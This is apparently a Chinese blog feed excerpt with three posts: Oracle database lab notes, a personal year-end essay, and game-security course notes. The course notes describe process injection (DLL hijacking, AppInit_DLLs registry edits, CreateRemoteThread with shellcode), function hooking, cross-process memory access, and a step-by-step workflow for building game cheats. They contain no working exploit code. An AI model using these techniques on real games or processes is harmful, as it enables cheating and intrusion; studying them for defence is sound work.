class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">TRIGGER</span> T_READER_DEl</span><br><span class="line">after <span class="keyword">delete</span> <span class="keyword">on</span> reader</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span></span><br><span class="line"><span class="keyword">begin</span>   </span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> Reader_Del_Bak <span class="keyword">values</span></span><br><span class="line">    (:old.read_ID,</span><br><span class="line">    :old.read_name,</span><br><span class="line">    :old.read_addr,</span><br><span class="line">    :old.read_tel,</span><br><span class="line">    <span class="keyword">user</span>,</span><br><span class="line">    sysdate</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">commit</span>;</span><br><span class="line">exception</span><br><span class="line">    <span class="keyword">when</span> others <span class="keyword">then</span></span><br><span class="line">        dbms_output.put_line(<span class="string">&#x27;error = &#x27;</span><span class="operator">||</span>to_char(sqlcode));</span><br><span class="line">        dbms_output.put_line(<span class="string">&#x27;error message = &#x27;</span><span class="operator">||</span>sqlerrm);</span><br><span class="line"><span class="keyword">end</span> T_READER_DEl;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114034159301.png" alt="image-20231114034159301" style="zoom:50%;" /><h5 id="查询触发器"><a href="#查询触发器" class="headerlink" title="查询触发器"></a>查询触发器</h5><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> object_name,object_type,created,status <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_type <span class="operator">=</span> <span class="string">&#x27;TRIGGER&#x27;</span> <span class="keyword">and</span> object_name <span class="operator">=</span> <span class="string">&#x27;DBMS_SET_PDB&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114035257187.png" alt="image-20231114035257187" style="zoom:33%;" /><h5 id="使用触发器"><a href="#使用触发器" class="headerlink" title="使用触发器"></a>使用触发器</h5><p>dd</p><h5 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop TRIGGER T_READER_DEL;</span><br></pre></td></tr></table></figure><h2 id="实验四：“图书借阅管理系统”Oracle数据库系统管理"><a href="#实验四：“图书借阅管理系统”Oracle数据库系统管理" class="headerlink" title="实验四：“图书借阅管理系统”Oracle数据库系统管理"></a><strong>实验四：“图书借阅管理系统”Oracle数据库系统管理</strong></h2><h3 id="实验原理-3"><a href="#实验原理-3" class="headerlink" title="实验原理"></a>实验原理</h3><p>使用Oracle SQL Developer或SQL Plus数据库工具对图书借阅管理系统数据库进行系统中的用户对特定数据库的权限的管理，以及使用数据泵工具程序完成数据库备份或恢复操作。</p><h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><ul><li>在图书借阅管理系统数据库Lib中，编写运行SQL语句实现“读者（R_LIB_READER）”角色创建。</li><li>针对“读者（R_LIB_READER）”角色，编写运行SQL程序赋予其相应的系统权限与数据库对象访问权限，要求最小范围地赋予其相应的系统权限，并合理地赋予其对READER表、BOOK表、RESERVE表访问权限。</li><li>编写运行概要文件LIB_READER_PROF创建SQL语句，实现数据库用户的资源访问和口令操作限制。</li><li>编写运行创建读者用户U_LIB_READER的SQL语句，并分派角色R_LIB_READER和概要文件LIB_READER_PROF。</li><li>在以上用户权限基础上，再编写运行SQL语句实现U_LIB_READER用户被赋予访问TITLE表对象的SELECT权限。</li><li>U_LIB_READER用户登录连接Lib数据库，编写运行SQL语句验证U_LIB_READER用户对READER表、BOOK表、RESERVE表的增、删、查改访问权限。</li><li>以SYS用户，编写运行SQL语句查看所创建的用户、概要文件和角色对象元数据。</li><li>使用数据泵工具方法实现Lib数据库逻辑备份。</li><li>对Lib数据库中某对象进行删除破坏，然后使用数据泵工具方法实现Lib数据库逻辑恢复。</li></ul><blockquote><p>特别要求：Lib数据库中各个对象名称都需要添加本人学号作为后缀，如“R_LIB_READER_20220348021”格式。</p></blockquote><h3 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="用户权限管理"><a href="#用户权限管理" class="headerlink" title="用户权限管理"></a>用户权限管理</h4><blockquote><p>用户、概要文件和角色的创建</p></blockquote><p>由于LIBRARY_DBA用混具有DBA权限，不以提供给普通使用者访问数据库，因此需要为普通使用这种创建特定的用户，这里新创建一个名为U_LIB_READER_2022090914031的用户，将来可以使用改用户登录并查看LIBRARY_DBA方案下的READER表。</p><ul><li>在工具中选择其他用户目录并点击，选择添加用户</li></ul><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203145145833.png" alt="image-20231203145145833" style="zoom:50%;" /><p>注：Navicat创建用户对用户名有限制，这里创建<code>C##U_LIB_READER_2022090914031</code>用户</p><ul><li>对新创建的用户要设置特定的资源访问限制，因此需要新创建一个名为C##LIB_READER_PROF的概要文件。由于navicat并没有创建概要文件的GUI界面，故采用SQL语句来创建。</li></ul><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203151127455.png" alt="image-20231203151127455" style="zoom:50%;" /><ul><li>对新创建的用户要设置特定的权限，可以通过觉得的方式来赋予权限，因此新创建一个名为R_LIB_READER_2022090914031的角色</li></ul><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203150502495.png" alt="image-20231203150502495" style="zoom:50%;" /><blockquote><p>分配概要文件和权限的赋予与回收</p></blockquote><ul><li>把C##LIB_READER_PROF概要文件赋予U_LIB_READER_2022090914031用户，并使资源生效</li></ul><p><code>ALTER USER C##U_LIB_READER_2022090914031 PROFILE C##LIB_READER_PROF;</code></p><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203151528345.png" alt="image-20231203151528345" style="zoom: 33%;" /><p>修改动态参数 RESOURCE_LIMIT为TRUE的SQL语句如下</p><p><code>ALTER SYSTEM SET RESOURCE_LIMIT = TRUE</code></p><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203151643147.png" alt="image-20231203151643147" style="zoom:33%;" /><blockquote><p>删除创建的用户、概要文件和角色</p></blockquote><p>删除用户C##U_LIB_READER_2022090914031,profile和pole</p><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203152205493.png" alt="image-20231203152205493" style="zoom:50%;" /><h4 id="数据库备份与恢复"><a href="#数据库备份与恢复" class="headerlink" title="数据库备份与恢复"></a>数据库备份与恢复</h4><p>应对数据库安全物理威胁，防范数据丢失或损坏的主要解决方案是数据备份与恢复技术。可以使用数据泵的导出导入功能实现对数据的逻辑备份，或使用RMAN的自动备份技术实现对数据的物理备份。</p><blockquote><p>数据泵备份与恢复</p></blockquote><p>直接点击navicat上方导航栏中的数据泵，选择数据泵导出，即可</p><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203152747839.png" alt="image-20231203152747839" style="zoom: 33%;" /><p>点击运行，就开始导出备份。</p><p>备份结束后，删除READER表中的所有数据，然后进行LIBRARY_DBA方案的导入操作。</p><p>导入步骤与导出相同。</p><blockquote><p>RMAN备份与恢复</p></blockquote><ul><li>备份准备。首先使用ARCHIVE LOG LIST命令查看当前数据库，已确认当前处于归档模式。</li></ul><img src="C:\Users\杨欣然\AppData\Roaming\Typora\typora-user-images\image-20231203153528783.png" alt="image-20231203153528783" style="zoom: 33%;" /><ul><li>登录RMAN，使用RMAN备份数据文件</li></ul><p><code>backup datafile 1;</code></p><ul><li>用RMAN恢复数据文件的操作</li></ul><p>登录RMAN，将要恢复的回溯局文件脱机，</p><p><code>sql &#39;ALTER DATABASEDATAFILE 6 OFFLINE;</code></p><p>重建数据文件</p><p><code>RESTORE DATAFILE 6;</code></p><p>恢复数据文件</p><p><code>RECOVER DATAFILE 6;</code></p><p>使数据文件联机</p><p><code>sql ’ALTERDATABASEDATAFILE6 OUTLINE;</code></p>]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课内 </tag>
            
            <tag> oracle </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年度</title>
      <link href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6/"/>
      <url>/2024/01/01/2023%E5%B9%B4%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>2023年好像过的并不好，但是具体发生了什么我却一点印象都没有了，现在我坐在乐山路边，看着旁边耀眼的烟花，翻手机相册，回顾这浑浑噩噩的一年。</p><p>一月二号人生第一次烫头，以大失败告终。第一次去酒吧，喝了第一杯一点也不好喝的红色的鸡尾酒，为什么点是因为那是当时店里面度数最高的酒，这也为我之后这浑噩的醉酒生活埋下了伏笔。。一月五号，生日当天过的还算开心然而我今年第一次听《网易云》就是一月五号然后就听了你吗一整年。后来和及哥去宽窄巷子吃东坡肘子，可以说今年吃的好吃的都是及哥带我去的还是相当感动哈。</p><p>二月份，报了urban课除了小时候跳的两年拉丁舞之外又一次按照自己的意愿跳舞💃，挺有意思的哈哈哈。还有呢，和那群很好很好的朋友去339喝酒通宵在大马路上发疯在忘记了名字的湖旁边回忆过去然后在龙泉山看不存在的日出。这一切好像都发生在昨天也好像已经是好久好久之前的事情了。</p><p>三月份四月份都过得不好，翻看日记想起那段时间疯狂迷恋的人，想起来他第一次带我去那家酒馆喝酒然后打车去他家睡觉第二天被辅导员打电话叫起来。然后没过多久就给高中那位男士第一次真正意义上的表白。当我再次正视这一切的时候我明白世界是一场巨大的舞台剧，我却在演戏的过程中假戏真做，说是迷失自己也好，说是自欺欺人也罢，事实就是我一边讨厌这一切一边继续表演。</p><p>之后就是一段混乱的开始，混乱的生活，混乱的感情，混乱的学习。唯一的欣慰可能是重拾了摄影，去了人生第一场线下赛，打了第一份靠自己实力获得的工作，写了第一个完整的小说。</p><p>然后呢，之后的很长一段时间都在为了护网而烦恼，第一次接触这个并不算单纯的社会也第一次一个人出远门到了另一个城市，像一个大人一样上班下班，应酬，揣摩人情世故，好像一夜之间又长大好多。护网结束之后工作和学习感觉都停滞了，又认识了解新的人，开始写那些矫揉造作的文字。渐渐的我发现感情实在不是一个高尚的东西，从迷恋到疯狂痴迷到恶心到冷漠直到无话可说只需要不到两个月的时间，我也可以在仅仅两个月之内就发生翻天覆地的变化，就像我已经无法想象今年年初的我是怎样的了。还有太多太多的人和事，我说不出来，但我觉得我和他们的缘分在一天一天的消散。到了最后，我是否会忘记了所有，然后过着一眼就望到头的朝九晚五的生活呢。我有的时候很渴望那样的生活，这让我感觉自己是一个大人，是一个经济自由财富自由的生活的主人，但我知道这都是骗局，我不过是被一些东西遮住了眼睛。就像我不停的说我讨厌某人看不起某人但我努力的目的到头来也不过是超过那些我所厌恶的人试图用我的方法来证明我是对的。我太想去证明了，这么多年，从高中开始，第一次和班主任对着干开始，我就幻想着向所有人证明。竞赛带给我的到底是什么呢，我越来越说不明白但我知道它给我的伤痛将让我用尽一生去治愈。</p><p>而CTF呢，Web呢，我明白他们是换了一个包装的另一个black hole会渐渐吸走我身上的某种东西。但我不在乎了，在我第一次丢下哲学，第一次丢掉西西弗斯的巨石然后走向巴库斯，这一路上太多东西变了我也不再是什么也不在乎的少年。所以我不断回忆过去，我知道过去的我很耀眼很优秀但是我也是亲手把我变成了另一个人，另一个不伦不类的小丑。</p><p>当我意识到我已经病了的时候，已经坐在医院走廊，手里面是两张很轻很轻的报告单，但是这不能说明什么，医生给我开的药我没有买，那些劝谏的话语我没有听，好像终于活成了自己梦里面的模样。我记得她看完我写的随笔后说我”压抑又疯狂”，但她帮不了我，没有人能帮的了我，说到底这就是我也许才是我想要的结果。那些窒息的时刻，那些自我感动的时刻，我不想告诉任何人因为我根本开不了口，我只是一个劲的听歌，因为我哭不出来，很久很久之前，我就发现，自己一滴泪也流不出来了。</p><p>好吧，这只是一个年终总结，我不该老是说这些没有意义的话。我知道我听了一整年《网易云》，也难过了一整年。可是也有很多好的东西发生了不是吗，我吃的跷脚牛肉和那几碗饭也值得我炫耀一辈子不是吗，哈哈。我吃过那么多好吃的，还遇见了那么有趣的人，不论是不愿承认的喜欢的人，还是刻意喜欢的人，还是已经在意了几年直到现在也没办法释然的人，我爱的人，爱我的人。兜兜转转，满是回忆。最后再当几天十多岁的小屁孩，我就莫名其妙变成奔三的老人，以前总觉得时间还长，但它真的过得很快。一首歌里面写，”他们说，随着年龄的增长，一年的相对时长会变短，一年的比率在人生中会越变越小，所以时间变得越来越快。”我认为很有道理，所以我不要再被困在过去了，我要感受当下，感受当下的每一分每一秒。</p><p>2023的最后几个月是由无数个黑夜构成的。我记得我坐在东郊记忆的路边点燃了人生第一根烟，坐在一个小区门口数着时间等天亮，记得无数个深夜躲在电脑面前奋斗，幻想自己某一天也可以变得很成功很优秀，记得无数次在酒吧里大口大口的罐着烈酒，在我最喜欢的小酒馆发生一些也许会难忘终生的事情。和那位我永远看不透的人坐在一起互相坦白这这些年说不出口的秘密好像要把这一切黑暗的，人性的，难以启齿的事情都杀死在烈日之下。在望江路上和她散步然后去河边吹风互相祝对方幸福，心里面却已经明白有些东西已经走到尽头。我爱黑夜，却从未抬头看过天上的月亮。我爱日出，却只是用镜头拍下那些橘子海甚至没有真正静下心来观看哪怕一次完整的过程。</p><p>2022年底我希望这一年能更加努力，实际上今年有没有更加努力呢，我不知道。</p><p>至于2024，我是在不知道该说什么，我只希望，我能别在丢掉我身上的那些东西了，不管是好的还是坏的，我都想留下，至少不要只剩下空白和麻木。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 年度总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tx菁英班游戏安全</title>
      <link href="/2023/12/21/tx%E8%8F%81%E8%8B%B1%E7%8F%AD%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
      <url>/2023/12/21/tx%E8%8F%81%E8%8B%B1%E7%8F%AD%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
      
        <content type="html"><![CDATA[<h2 id="游戏安全开发基础-PC"><a href="#游戏安全开发基础-PC" class="headerlink" title="游戏安全开发基础(PC)"></a>游戏安全开发基础(PC)</h2><h3 id="软件开发与调试"><a href="#软件开发与调试" class="headerlink" title="软件开发与调试"></a>软件开发与调试</h3><h4 id="指令架构"><a href="#指令架构" class="headerlink" title="指令架构"></a>指令架构</h4><ul><li>X86指令架构(PC端)</li></ul><p>X86架构(The X8 architecture)是微处理器执行的计算机语言指令集，指一个Intel通用计算机系统的标准编号缩写，也表示一套通用的计算机指令集合。</p><ul><li>ARM指令架构(移动端)</li></ul><p>ARM架构(过去称作进阶精简指令集机器(Advanced RISC Machine)，更早称作Acorn RISC Machine)是一个32位元精简指令集(RISC)，中央处理器(Processor)架构，其广泛地使用在许多嵌入式系统(embedded)设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目的为低耗电的特性。</p><h4 id="常见编译器"><a href="#常见编译器" class="headerlink" title="常见编译器"></a>常见编译器</h4><ul><li>MSVC</li></ul><p>Microsoft Visual C&#x2F;C++</p><ul><li>LLVM</li></ul><p>Low Level Virtual Machine</p><h4 id="静态编译与动态链接库编译"><a href="#静态编译与动态链接库编译" class="headerlink" title="静态编译与动态链接库编译"></a>静态编译与动态链接库编译</h4><p>在vs的project属性页里面有一行运行库可以选择，常见的就是MT(静态)编译和MD(动态)编译。就分别是静态编译和动态编译。这两种编译方式编译出来的exe文件大小有很大区别，动态编译出来的文件很小。</p><ul><li>使用反汇编工具(IDA pro)查看不同编译选项编译的C++程序的汇编代码。</li><li>使用Visual Studio调试自己开发的C++程序(就是debug)</li><li>使用Cheat Engine调试自开发的C++程序</li></ul><h4 id="软件加壳与破解"><a href="#软件加壳与破解" class="headerlink" title="软件加壳与破解"></a>软件加壳与破解</h4><blockquote><p>常见的软件加密壳</p></blockquote><ul><li>VMProject</li><li>UPX压缩壳</li><li>SafeEngine</li><li>Themida</li></ul><blockquote><p>使用Cheat Engine破解控制台程序</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std:Lsount&lt;&lt;<span class="string">&quot;Hello World\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用控制台不在输出Count数据</li></ul><p>使用CE打开程序，然后把print哪一行命令改成nop。程序就停止打印</p><ul><li>使得控制台输出count的时间更长。</li></ul><p>汇编代码里面<code>mov exc,000001F4</code>就是指传递给sleep函数的参数是500毫秒(000001F4)、我们直接改成5000的十六进制的值<code>mov exc,00001388</code></p><h3 id="游戏引擎安全知识介绍"><a href="#游戏引擎安全知识介绍" class="headerlink" title="游戏引擎安全知识介绍"></a>游戏引擎安全知识介绍</h3><h4 id="UE4引擎安全知识介绍"><a href="#UE4引擎安全知识介绍" class="headerlink" title="UE4引擎安全知识介绍"></a>UE4引擎安全知识介绍</h4><ul><li>ULevel：UE的场景划分模式是基于子关卡来做的，UE4和其他支持大世界的引擎一样支持游戏场景中的物体动态加载与卸载，UE4中的动态加载卸载的子关卡叫做流关卡(StreamingLevel、ULevelStreaming类)，一开始就加载的子关卡叫持久关卡(PersistentLevel)</li><li>UWorld：游戏主场景，游戏过程中，一般只存在一个UWorld实例</li><li>GNames：包含游戏中所有对象的命名字符串信息</li><li>GObjets：包含所有游戏对象的链表</li><li>Gamelnstance：顾名思义，游戏实例，保存着当前的World和其他整个游戏的信息，官方解释是一个正在运行的游戏的高级别管理对象，在游戏创建时生成，游戏关闭时销毁，一个游戏中可以有多个Gamelnstance。在游戏中切换关卡，Gamelnstance不会销毁，切换关卡时可用Gamelnstance携带信息</li><li>GameMode：负责指定游戏的规则，也就是应该如何玩游戏、遵守哪些规则</li><li>GameState：游戏状态，记录游戏的数据，比如当前游戏的进度，世界人物的完成状态等，可同步到各个客户端</li><li>UObject：引擎对象的最小单位</li><li>Actor： 在UE离不是某种具象化的3D世界对象，而是世界里面的种种元素，用更泛化抽象的概念来看，小到一个个地上的石头，大到整个世界的运行规则，更像是一个容器</li><li>RootComponent：对象根组件，包含对象的位置信息(坐标、朝向)</li><li>Pawn 是作为世界中的一个“代理”的Actor。Pawn可以由控制器处理，它们可以轻松地接受输入，并且可以执行各种各样的类似于玩家的动作。</li><li>Character是类人的Pawn。它默认包含一个用于碰撞的CapsuleComponent (胶囊体组件)和CharacterMovementComponent (角色运动组件) 它可以进行基本的拟人运动它可以平滑地在网格上复制运动，并且它具有一些动画相关的功能。</li><li>Controller是负责管理Pawn的Actor，分为AIController和PlaverController。其中PlayerController (玩家控制器) 是Pawn和控制它的人类玩家间的接口。PlayerController本质上代表了人类玩家的意愿。</li></ul><h4 id="Unity引擎安全知识介绍"><a href="#Unity引擎安全知识介绍" class="headerlink" title="Unity引擎安全知识介绍"></a>Unity引擎安全知识介绍</h4><p>Unity脚本后处理(Scripting Backend)的两种方式Mono和IL2CPP。</p><h5 id="Mono"><a href="#Mono" class="headerlink" title="Mono"></a>Mono</h5><p>Mono是一个由Xamarin公司所主持的自由开放源码项目Mono的目标是在尽可能多的台上使net标准的东西能正常运行的一套工具，核心在于”跨平台的让net代码能运行起来“库。Mono组成组件: C# 编译器CLI虚拟机，以及核心类别程序共中间语言 (CommonMono的编译器负责生成符合公共语言规范的映射代码，即公不同解析。我的理解就是工厂方法实现Intermediate Language，CIL)</p><blockquote><p>IL</p></blockquote><p>IL的全称是Intermediate Language，很多时候还会看到CIL (特指在Net平台下的IL标准)。翻译过来就是中间语言。它是一种属于通用语言架构和.NET框架的低阶的人类可读的编程语言。CIL类似一个面向对象的汇编语言，并且它是完全基于堆栈的，它运行在虚拟机上 (.NetFramework,Mono VM) 的语言。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231204020406336.png" alt="image-20231204020406336" style="zoom:33%;" /><h5 id="IL2CPP"><a href="#IL2CPP" class="headerlink" title="IL2CPP"></a>IL2CPP</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231204020525845.png" alt="image-20231204020525845" style="zoom: 33%;" /><h3 id="进程注入与代码Hook的原理"><a href="#进程注入与代码Hook的原理" class="headerlink" title="进程注入与代码Hook的原理"></a>进程注入与代码Hook的原理</h3><h4 id="进程注入的分类"><a href="#进程注入的分类" class="headerlink" title="进程注入的分类"></a>进程注入的分类</h4><ul><li>静态注入——进程创建前完成注入<ul><li>导入表注入</li><li>DLL挟持注入</li><li>注册表注入</li></ul></li><li>动态注入——进程运行过程中进行注入<ul><li>远程线程注入</li><li>消息钩子注入</li><li>APC注入</li><li>IAT(导入表函数)挟持注入</li></ul></li></ul><h4 id="常见静态注入"><a href="#常见静态注入" class="headerlink" title="常见静态注入"></a>常见静态注入</h4><h5 id="导入表注入"><a href="#导入表注入" class="headerlink" title="导入表注入"></a>导入表注入</h5><p>在PE的文件格式中，IMAGE_NT_HEADER的OptionalHeader存储着数据用户表，第二个表项就是导入表，指向着一个IMAGE_IMPORT_DESCRIPTOR(IID)结构体数组。</p><p>而每一个IMAGE_IMPORT_DESCRIPTOR的结构，对应一个DLL信息。进程启动时系统会遍历这个数组，加载所依赖的dll到内存。新词修改导入表结构，增加一个导入表项，就可以实现让程序加载我们的dll，从而实现注入。</p><h5 id="DLL劫持注入"><a href="#DLL劫持注入" class="headerlink" title="DLL劫持注入"></a>DLL劫持注入</h5><ul><li>DLL劫持技术：当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。</li><li>由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。</li><li>首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。</li><li>利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持了。</li><li>如果想办法把应用程序所依赖的在搜索路径的DLL，放置一个同名DLL到比这个路径更优先的目录去，则这个刻意放置的同名DLL会被加载</li></ul><h5 id="注册表注入"><a href="#注册表注入" class="headerlink" title="注册表注入"></a>注册表注入</h5><p>Window的每个GUI程序，在启动的时候，都会扫描注册表的<code>Applnit_DLLs</code>项，看看其中有没有指定的目标库，如果有，那就再程序运行时，主动加载。</p><p>利用这一特性，就可以完成注入但是仅限于加载了user32.dll的目标(windows游戏都会加载<code>user32.dll</code>)</p><p><code>HKEY_LOCALMACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersionlWindows</code>下找到<code>Applnit_DLLs</code>和<code>LoadApplnit_DLLs</code>项<br>将<code>Applnit_DLLs</code>值修改为目标DII完整路径<br>修改<code>LoadApplnit DLLs</code>值为1(意思是允许默认加载动态库</p><h4 id="常见动态注入"><a href="#常见动态注入" class="headerlink" title="常见动态注入"></a>常见动态注入</h4><h5 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h5><p>Windows提供了<code>CreateRemoteThread</code>函数允许一个进程在另一个进程上创建线程。通过巧妙地使用该函数可以把指定的DLL加载到其它进程。</p><p>常见的利用CreateRemoteThread来实现远程线程注入的方式有两种:</p><ul><li><p>定义远程线程入口地址为LoadLibraryW并将需要加载的模块路径作为参数传入</p></li><li><p>编写ShellCode并将远程线程入口地址定义为ShellCode的执行地址，在ShellCode中调用Map到目标进程中的DLL入口函数</p></li></ul><h4 id="常见的Hook方式"><a href="#常见的Hook方式" class="headerlink" title="常见的Hook方式"></a>常见的Hook方式</h4><ul><li>Inline Hook</li><li>虚表 Hook</li><li>IAT(导入表) Hook</li><li>内核APIHook(SSDT SSSDT)</li><li>···</li></ul><h3 id="内存读写与监控"><a href="#内存读写与监控" class="headerlink" title="内存读写与监控"></a>内存读写与监控</h3><h4 id="常见跨进程内存读写方式"><a href="#常见跨进程内存读写方式" class="headerlink" title="常见跨进程内存读写方式"></a>常见跨进程内存读写方式</h4><ul><li>用户层内存读写方式<ul><li>OpenProcess+ReadProcessMemory</li><li>劫持句柄+ReadProcessMemory</li><li>映射物理内存到自进程</li></ul></li><li>内核层内存读写方式<ul><li>ZwReadVirtualMemory&#x2F;NtReadVirtualMemory</li><li>MmCopyVirtualMemory</li><li>MmCopyMemory</li><li>RtlCopyMemory</li></ul></li></ul><h4 id="常见跨进程内存读写监控方式"><a href="#常见跨进程内存读写监控方式" class="headerlink" title="常见跨进程内存读写监控方式"></a>常见跨进程内存读写监控方式</h4><ul><li>用户层内存读写监控方式<ul><li>硬件断点</li><li>INET3断点</li><li>页面异常断点</li><li>ProcessWorkingSet</li></ul></li><li>内核层内存读写监控方式<ul><li>VT EPT断点监控</li></ul></li></ul><h2 id="游戏安全开发基础-移动"><a href="#游戏安全开发基础-移动" class="headerlink" title="游戏安全开发基础(移动)"></a>游戏安全开发基础(移动)</h2><h3 id="定制化外挂开发流程"><a href="#定制化外挂开发流程" class="headerlink" title="定制化外挂开发流程"></a>定制化外挂开发流程</h3><h4 id="逆向分析游戏逻辑"><a href="#逆向分析游戏逻辑" class="headerlink" title="逆向分析游戏逻辑"></a>逆向分析游戏逻辑</h4><p>进入游戏外挂开发阶段之前，需要对作弊功能涉及的游戏逻辑展开逆向分析。只有分析清楚相关游戏逻辑的实现方式，才能针对特定的游戏逻辑实现外挂。以大飞机为例，要实现战机无敌的功能，则需要分析游戏的伤害逻辑；要实现秒杀功能，则需要分析游戏的攻击逻辑</p><h4 id="验证外挂功能是否可行"><a href="#验证外挂功能是否可行" class="headerlink" title="验证外挂功能是否可行"></a>验证外挂功能是否可行</h4><p>验证外挂功能的可行性是外挂功能实现阶段的前置条件。如果某个游戏逻辑的安全性较好，那么游戏的后台服务器会校验大部分游戏的逻辑安全性，该游戏可实现的外挂功能非常有限。</p><h4 id="注入游戏进程"><a href="#注入游戏进程" class="headerlink" title="注入游戏进程"></a>注入游戏进程</h4><p>如果外挂需要修改游戏进程的代码，则必须确保已注入游戏进程。注入游戏进程的方法丰富多样，在Android平台上可以通过ptrace方式将共享链接库注入游戏进程中，并执行共享链接库的代码。</p><h4 id="枚举游戏进程模块"><a href="#枚举游戏进程模块" class="headerlink" title="枚举游戏进程模块"></a>枚举游戏进程模块</h4><p>游戏进程在运行过程中会加载很多内部和外部的模块，定制化外挂必须获取游戏主要逻辑块的基址，才能修改实现作弊功能。在Android平台上，可通过”&#x2F;proc&#x2F;$pid&#x2F;maps”文件获取游戏进程中当前加载的所有模块名称、基址、权限等信息。</p><h4 id="Hook关键函数"><a href="#Hook关键函数" class="headerlink" title="Hook关键函数"></a>Hook关键函数</h4><p>外挂成功注入游戏进程后，可以通过对游戏主逻辑模块的代码进行修改，一般会对游戏的关键函数进行Hook操作，在游戏调用挂件函数时获得执行权限，从而实现外挂功能。Hook的本质是劫持函数调用，在Android平台上可通过导入表HOOK，Inline Hook实现Hook功能</p><h4 id="游戏内存数据修改"><a href="#游戏内存数据修改" class="headerlink" title="游戏内存数据修改"></a>游戏内存数据修改</h4><p>除了对代码的修改，定制化外挂也经常对游戏内存数据进行修改，实现作弊功能。定制化外挂通常采用注入式篡改游戏内容，包括内存中的代码和数据。</p><h3 id="注入技术的实现原理"><a href="#注入技术的实现原理" class="headerlink" title="注入技术的实现原理"></a>注入技术的实现原理</h3><h4 id="进程注入"><a href="#进程注入" class="headerlink" 